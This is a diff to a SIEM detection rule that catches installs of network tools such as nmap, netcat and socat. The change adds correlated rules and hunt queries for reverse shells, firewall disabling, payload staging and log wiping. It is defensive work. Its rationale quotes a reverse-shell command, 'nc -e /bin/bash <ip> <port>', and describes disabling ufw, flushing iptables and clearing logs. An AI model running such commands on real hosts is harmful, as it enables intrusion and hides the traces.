@@ -232,19 +232,58 @@ graylog:
   query: (((data_process_exec_process_binary:/.*\/[Aa][Pp][Tt]/ OR data_process_exec_process_binary:/.*\/[Aa][Pp][Tt]-[Gg][Ee][Tt]/) AND data_process_exec_process_arguments:/.*[Ii][Nn][Ss][Tt][Aa][Ll][Ll].*/) OR (data_process_exec_process_binary:/.*\/[Yy][Uu][Mm]/ AND (data_process_exec_process_arguments:/.*[Ll][Oo][Cc][Aa][Ll][Ii][Nn][Ss][Tt][Aa][Ll][Ll].*/ OR data_process_exec_process_arguments:/.*[Ii][Nn][Ss][Tt][Aa][Ll][Ll].*/)) OR (data_process_exec_process_binary:/.*\/[Rr][Pp][Mm]/ AND data_process_exec_process_arguments:/.*-[Ii].*/) OR (data_process_exec_process_binary:/.*\/[Dd][Pp][Kk][Gg]/ AND (data_process_exec_process_arguments:/.*--[Ii][Nn][Ss][Tt][Aa][Ll][Ll].*/ OR data_process_exec_process_arguments:/.*-[Ii].*/))) AND (data_process_exec_process_arguments:/.*[Nn][Mm][Aa][Pp].*/ OR data_process_exec_process_arguments:/.* [Nn][Cc].*/ OR data_process_exec_process_arguments:/.*[Nn][Ee][Tt][Cc][Aa][Tt].*/ OR data_process_exec_process_arguments:/.*[Ww][Ii][Rr][Ee][Ss][Hh][Aa][Rr][Kk].*/ OR data_process_exec_process_arguments:/.*[Tt][Ss][Hh][Aa][Rr][Kk].*/ OR data_process_exec_process_arguments:/.*[Oo][Pp][Ee][Nn][Cc][Oo][Nn][Nn][Ee][Cc][Tt].*/ OR data_process_exec_process_arguments:/.*[Pp][Rr][Oo][Xx][Yy][Cc][Hh][Aa][Ii][Nn][Ss].*/ OR data_process_exec_process_arguments:/.*[Ss][Oo][Cc][Aa][Tt].*/)
 
 correlation:
-  # Authored by the correlation engine for review.
+  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
+  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
+  related_rules:
+  - id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
+    name: Potential Netcat Reverse Shell Execution
+    reason: Netcat is one of the exact packages this rule catches being installed; the textbook next move is `nc -e /bin/bash <ip> <port>` to open the reverse/bind shell, so an nc shell on the same host right after the install turns a tool drop into live C2.
+  - id: a015e032-146d-4717-8944-7a1884122111
+    name: Linux HackTool Execution
+    reason: 'Confirms the host is now operated as an attack platform: once the actor has apt/yum-installed dual-use net tooling they run named offensive tools (naabu, netdiscover, autorecon, ncrack, hydra, sqlmap) - several are scanners equivalent to the nmap this rule saw installed, so a hit here is the installed arsenal being put to use.'
+  - id: 97de11cd-4b67-4abf-9a8b-1020e670aa9e
+    name: Pnscan Binary Data Transmission Activity
+    reason: Network discovery is the main reason to install nmap; this catches a scanner actively sweeping/transmitting across the network (TeamTNT-style worming) by its argument pattern, corroborating that the just-installed scanning tooling is mapping/attacking internal hosts for lateral movement.
+  - id: 3be619f4-d9ec-4ea8-a173-18fdd01996ab
+    name: Flush Iptables Ufw Chain
+    reason: Freshly-installed nc/socat listeners, proxychains pivots and nmap scans only work if the host firewall is out of the way; flushing iptables/ip6tables (`-F` on the ufw chains) right after the install is the enabling step that opens inbound/outbound paths for the new tooling.
+  - id: 84c9e83c-599a-458a-a0cb-0ecce44e807a
+    name: UFW Disable Attempt
+    reason: 'Same enabling move via a different utility: `ufw disable` tears down host packet filtering so the reverse shells, tunnels and scanners these packages provide can reach the network - installing net tools then disabling ufw is a tight back-to-back pair.'
+  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+    name: Suspicious Download and Execute Pattern via Curl/Wget
+    reason: 'Co-occurring staging: hands-on-keyboard actors arm a box with both the distro package manager (this rule) and curl/wget pulls of custom implants/stagers into /tmp or /dev/shm, so a download-and-run on the same host in the window widens a single install into a full tooling drop.'
+  - id: 818f7b24-0fba-4c49-a073-8b755573b9c7
+    name: Linux Webshell Indicators
+    reason: 'Likely foothold/precursor: on internet-facing Linux the shell that runs `apt install nmap/nc` is frequently a child of a web server (webshell) - this rule''s own reference is a captured attacker history from such a compromise, so a webshell sub-process before the install is how the operator got the privileged shell.'
+  - id: 80915f59-9b56-4616-9de0-fd0dea6c12fe
+    name: Linux Logs Clearing Attempts
+    reason: 'Anti-forensics follow-on: after arming the host the operator wipes /var/log and shell history to hide the package install and everything run with the new tools, so log-clearing on the same host closes the hands-on-keyboard session this rule opened.'
+  window: 2h
   enrichment_searches:
-  # Rule-specific telemetry pivots the engine runs around an alert from this rule,
-  # scoped to the alert's host/user/IP within the window (behaviour-targeted, not a sweep).
-    - name: "Shell / interpreter execution on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh]|\/[Bb][Uu][Ss][Yy][Bb][Oo][Xx])/) OR (data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee]|\/[Ll][Uu][Aa]|\/[Aa][Ww][Kk])/))'
-      pivot_on: [host]
-      window: 1h
-    - name: "Reconnaissance commands on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee][Cc][Tt][Ll]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp]|\/[Ww]|\/[Ww][Hh][Oo]|\/[Ll][Aa][Ss][Tt]|\/[Ll][Ss][Oo][Ff]|\/[Nn][Mm][Aa][Pp]|\/[Dd][Ii][Gg]|\/[Ff][Ii][Nn][Dd])/'
-      pivot_on: [host]
-      window: 1h
-    - name: "Privilege-escalation tooling executed on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ss][Uu][Dd][Oo]|\/[Ss][Uu]|\/[Pp][Kk][Ee][Xx][Ee][Cc]|\/[Dd][Oo][Aa][Ss]|\/[Ss][Ee][Tt][Cc][Aa][Pp]|\/[Cc][Hh][Ss][Hh]|\/[Nn][Ee][Ww][Gg][Rr][Pp])/'
-      pivot_on: [host]
-      window: 2h
+  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
+  - name: Installed offensive network/recon tools executed on this host
+    query: data_process_exec_process_binary:/.*(\/[Nn][Cc]|\/[Nn][Cc][Aa][Tt]|\/[Nn][Ee][Tt][Cc][Aa][Tt]|\/[Nn][Mm][Aa][Pp]|\/[Mm][Aa][Ss][Ss][Cc][Aa][Nn]|\/[Ss][Oo][Cc][Aa][Tt]|\/[Pp][Rr][Oo][Xx][Yy][Cc][Hh][Aa][Ii][Nn][Ss]|\/[Pp][Rr][Oo][Xx][Yy][Cc][Hh][Aa][Ii][Nn][Ss]4|\/[Tt][Ss][Hh][Aa][Rr][Kk]|\/[Ww][Ii][Rr][Ee][Ss][Hh][Aa][Rr][Kk]|\/[Dd][Uu][Mm][Pp][Cc][Aa][Pp]|\/[Tt][Cc][Pp][Dd][Uu][Mm][Pp]|\/[Oo][Pp][Ee][Nn][Cc][Oo][Nn][Nn][Ee][Cc][Tt]|\/[Hh][Pp][Ii][Nn][Gg]3)/
+    pivot_on:
+    - host
+    window: 4h
+  - name: Reverse shell / tunnel / relay establishment on this host
+    query: ((data_process_exec_process_binary:/.*(\/[Nn][Cc]|\/[Nn][Cc][Aa][Tt]|\/[Ss][Oo][Cc][Aa][Tt])/ AND data_process_exec_process_arguments:/.*( -[Ee] | -[Cc] |[Ee][Xx][Ee][Cc]:|[Tt][Cc][Pp]-[Ll][Ii][Ss][Tt][Ee][Nn]).*/) OR (data_process_exec_process_arguments:/.*(\/[Dd][Ee][Vv]\/[Tt][Cc][Pp]\/|\/[Dd][Ee][Vv]\/[Uu][Dd][Pp]\/|[Mm][Kk][Ff][Ii][Ff][Oo]).*/))
+    pivot_on:
+    - host
+    window: 4h
+  - name: Host firewall / packet filter flushed or disabled on this host
+    query: ((data_process_exec_process_binary:/.*(\/[Ii][Pp][Tt][Aa][Bb][Ll][Ee][Ss]|\/[Ii][Pp]6[Tt][Aa][Bb][Ll][Ee][Ss]|\/[Nn][Ff][Tt]|\/[Nn][Ff][Tt][Aa][Bb][Ll][Ee][Ss])/ AND data_process_exec_process_arguments:/.*(-[Ff]|[Ff][Ll][Uu][Ss][Hh]).*/) OR (data_process_exec_process_binary:/.*\/[Uu][Ff][Ww]/ AND data_process_exec_process_arguments:/.*([Dd][Ii][Ss][Aa][Bb][Ll][Ee]|[Rr][Ee][Ss][Ee][Tt]).*/) OR (data_process_exec_process_binary:/.*\/[Ff][Ii][Rr][Ee][Ww][Aa][Ll][Ll]-[Cc][Mm][Dd]/))
+    pivot_on:
+    - host
+    window: 2h
+  - name: Payload download and staging via curl/wget into tmp or dev-shm on this host
+    query: (data_process_exec_process_binary:/.*(\/[Cc][Uu][Rr][Ll]|\/[Ww][Gg][Ee][Tt])/ AND data_process_exec_process_arguments:/.*(\/[Tt][Mm][Pp]\/|\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]|\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]).*/)
+    pivot_on:
+    - host
+    window: 2h
+  - name: Log and shell-history clearing on this host
+    query: (data_process_exec_process_binary:/.*(\/[Rr][Mm]|\/[Ss][Hh][Rr][Ee][Dd]|\/[Tt][Rr][Uu][Nn][Cc][Aa][Tt][Ee]|\/[Uu][Nn][Ll][Ii][Nn][Kk])/ AND data_process_exec_process_arguments:/.*(\/[Vv][Aa][Rr]\/[Ll][Oo][Gg]|[Bb][Aa][Ss][Hh]_[Hh][Ii][Ss][Tt][Oo][Rr][Yy]|[Ww][Tt][Mm][Pp]|[Aa][Uu][Tt][Hh]\.[Ll][Oo][Gg]|[Ss][Yy][Ss][Ll][Oo][Gg]).*/)
+    pivot_on:
+    - host
+    window: 4h
